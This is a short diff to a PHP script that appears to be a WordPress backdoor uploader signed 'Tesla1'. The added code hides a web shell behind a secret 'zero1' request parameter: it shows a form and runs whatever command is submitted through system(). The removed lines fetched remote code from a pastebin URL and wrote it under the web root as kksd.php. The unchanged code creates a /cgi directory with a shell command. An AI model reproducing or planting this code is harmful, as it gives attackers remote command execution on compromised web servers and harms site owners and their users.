@@ -1,16 +1,21 @@
 <?php
-$secho0 = $_SERVER['DOCUMENT_ROOT'] . '/cgi/index.html';
+if(isset($_REQUEST['zero1'])){
+        echo "<pre>";
+        echo "<form name='form' action='#' method='post'>
+       <input type='text' name='coba'/> <input type='submit' value='enter'/>
+       </form>";
+        $cmd = ($_POST['coba']);
+        system($cmd);
+        echo "</pre>";
+
+        $secho0 = $_SERVER['DOCUMENT_ROOT'] . '/cgi/index.html';
 $secho = $_SERVER['DOCUMENT_ROOT'] . '/cgi';
 $sedo = $_SERVER['SERVER_NAME'] . '/cgi';
+echo '<b>Automatic wordpress Uploader by Tesla1</b><br>Path jika upload gagal > ';
 echo $secho;
 
   $cmd = "mkdir $secho";
 system($cmd);
-
-$nama3= fopen($secho . '/kksd.php' ,'w+');
-  $file3 = file_get_contents('https://pastebin.com/raw/9Eb7yb8S');
-  $tulis3 = fwrite ($nama3 ,$file3);
- fclose($nama3);
 
 echo '<b>';
 
@@ -30,5 +35,9 @@ else { echo '.'; }
 }
 
 //echo '<a href="../cgi">' . $sedo; echo '</a>';
-?>
 
+
+        die;
+}
+
+?>
